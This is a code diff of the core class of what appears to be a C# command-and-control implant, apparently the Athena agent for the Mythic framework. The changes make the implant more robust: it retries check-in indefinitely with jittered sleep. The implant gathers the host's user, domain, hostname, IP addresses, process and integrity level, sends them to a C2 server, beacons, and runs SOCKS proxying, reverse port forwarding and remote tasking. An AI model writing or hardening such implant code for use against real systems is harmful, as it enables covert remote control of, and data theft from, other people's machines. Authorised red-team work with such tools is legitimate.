@@ -1,4 +1,4 @@
-﻿using Agent.Interfaces;
+using Agent.Interfaces;
 using Agent.Models;
 using Agent.Utilities;
 
@@ -16,7 +16,7 @@ namespace Agent
         private ILogger logger { get; set; }
         private ITaskManager taskManager { get; set; }
         private ITokenManager tokenManager { get; set; }
-        private IProfile _profile;
+        private IProfile? _profile;
 
         //Will need ISocksManager, IRpfwdManager, IForwarderManager
         public AthenaCore(IEnumerable<IProfile> profiles, ITaskManager taskManager, ILogger logger, IAgentConfig config, ITokenManager tokenManager, IEnumerable<IAgentMod> mods)
@@ -29,7 +29,14 @@ namespace Agent
             this.mods = mods;
 
             _profile = SelectProfile(99);
-            _profile.SetTaskingReceived += OnTaskingReceived;
+            if (_profile is not null)
+            {
+                _profile.SetTaskingReceived += OnTaskingReceived;
+            }
+            else
+            {
+                this.logger.Log("No communication profiles available.");
+            }
         }
         public async Task Start()
         {
@@ -38,13 +45,27 @@ namespace Agent
                 Environment.Exit(0);
             }
 
-            await this.ApplyMods();
-            if (!await this.CheckIn())
+            if (this._profile is null)
             {
-                throw new InvalidOperationException("Agent check-in failed; beacon was not started.");
+                this.logger.Log("Cannot start agent: no valid profile is configured.");
+                return;
             }
 
-            await this._profile.StartBeacon();
+            await this.ApplyMods().ConfigureAwait(false);
+            while (!await this.CheckIn().ConfigureAwait(false))
+            {
+                this.logger.Log("Agent check-in failed; retrying...");
+                await Task.Delay(Misc.GetSleep(this.config.sleep, this.config.jitter) * 1000).ConfigureAwait(false);
+            }
+
+            try
+            {
+                await this._profile.StartBeacon().ConfigureAwait(false);
+            }
+            catch (Exception ex)
+            {
+                this.logger.Log($"Beacon loop terminated with error: {ex}");
+            }
         }
 
         private async Task ApplyMods()
@@ -68,16 +89,16 @@ namespace Agent
             }
         }
 
-        private IProfile SelectProfile(int index)
+        private IProfile? SelectProfile(int index)
         {
-            if (index == 99) //Default Value
+            if (profiles == null || !profiles.Any())
             {
-                Random random = new Random();
-
-                return profiles.ElementAt(random.Next(profiles.Count()));
+                return null;
             }
 
-            return profiles.ElementAt(index);
+            return index == 99
+                ? profiles.ElementAt(Random.Shared.Next(profiles.Count()))
+                : profiles.ElementAtOrDefault(index) ?? profiles.First();
         }
 
         /// <summary>
@@ -85,6 +106,7 @@ namespace Agent
         /// </summary>
         public async Task<bool> CheckIn()
         {
+            using Process currentProcess = Process.GetCurrentProcess();
             Checkin ct = new Checkin()
             {
                 action = "checkin",
@@ -92,27 +114,24 @@ namespace Agent
                 os = Environment.OSVersion.ToString(),
                 user = Environment.UserName,
                 host = Dns.GetHostName(),
-                pid = Process.GetCurrentProcess().Id,
+                pid = currentProcess.Id,
                 uuid = this.config.uuid,
                 architecture = Misc.GetArch(),
                 domain = Environment.UserDomainName,
                 integrity_level = tokenManager.getIntegrity(),
-                process_name = Process.GetCurrentProcess().ProcessName
+                process_name = currentProcess.ProcessName
             };
 
             try
             {
                 CheckinResponse res = await _profile.Checkin(ct);
-
                 if (!CheckinResponseValidation.IsSuccessful(res))
                 {
                     return false;
                 }
 
                 this.updateAgentInfo(res);
-
                 return true;
-
             }
             catch
             {
@@ -124,24 +143,13 @@ namespace Agent
         /// Update the agent information on successful checkin with the Mythic server
         /// </summary>
         /// <param name="res">CheckIn Response</param>
-        private void updateAgentInfo(CheckinResponse res)
-        {
-            this.config.uuid = res.id;
-        }
+        private void updateAgentInfo(CheckinResponse res) => this.config.uuid = res.id;
 
-        private List<string> GetIPAddresses()
-        {
-            List<string> ipAddresses = new List<string>();
-            var netInterface = NetworkInterface.GetAllNetworkInterfaces();
-
-            foreach(var netInf in netInterface)
-            {
-                foreach (var ipProp in netInf.GetIPProperties().UnicastAddresses){
-                    ipAddresses.Add(ipProp.Address.ToString());
-                }
-            }
-            return ipAddresses;
-        }
+        private List<string> GetIPAddresses() =>
+            NetworkInterface.GetAllNetworkInterfaces()
+                .SelectMany(netInf => netInf.GetIPProperties().UnicastAddresses)
+                .Select(ipProp => ipProp.Address.ToString())
+                .ToList();
 
         private void OnTaskingReceived(object sender, TaskingReceivedArgs args)
         {
@@ -154,32 +162,30 @@ namespace Agent
 
         private async Task ProcessTaskingAsync(TaskingReceivedArgs args)
         {
-            if(args.tasking_response is null)
+            var response = args.tasking_response;
+            if (response is null)
             {
                 return;
             }
 
             var work = new List<Task>();
-            if (args.tasking_response.socks is not null)
-                work.Add(this.taskManager.HandleProxyResponses("socks", args.tasking_response.socks));
-            if (args.tasking_response.rpfwd is not null)
-                work.Add(this.taskManager.HandleProxyResponses("rportfwd", args.tasking_response.rpfwd));
-            if (args.tasking_response.tasks is not null)
-                work.AddRange(args.tasking_response.tasks
+            if (response.socks is not null)
+                work.Add(this.taskManager.HandleProxyResponses("socks", response.socks));
+            if (response.rpfwd is not null)
+                work.Add(this.taskManager.HandleProxyResponses("rportfwd", response.rpfwd));
+            if (response.tasks is not null)
+                work.AddRange(response.tasks
                     .Where(task => task is not null)
                     .Select(task => this.taskManager.StartTaskAsync(new ServerJob(task))));
-            if (args.tasking_response.delegates is not null)
-                work.Add(this.taskManager.HandleDelegateResponses(args.tasking_response.delegates));
-            if (args.tasking_response.responses is not null)
-                work.Add(this.taskManager.HandleServerResponses(args.tasking_response.responses));
-            if (args.tasking_response.interactive is not null)
-                work.Add(this.taskManager.HandleInteractiveResponses(args.tasking_response.interactive));
+            if (response.delegates is not null)
+                work.Add(this.taskManager.HandleDelegateResponses(response.delegates));
+            if (response.responses is not null)
+                work.Add(this.taskManager.HandleServerResponses(response.responses));
+            if (response.interactive is not null)
+                work.Add(this.taskManager.HandleInteractiveResponses(response.interactive));
             await Task.WhenAll(work);
         }
         //Is this correct?
-        private bool CheckKillDate()
-        {
-            return this.config.killDate > DateTime.Now;
-        }
+        private bool CheckKillDate() => this.config.killDate > DateTime.Now;
     }
 }
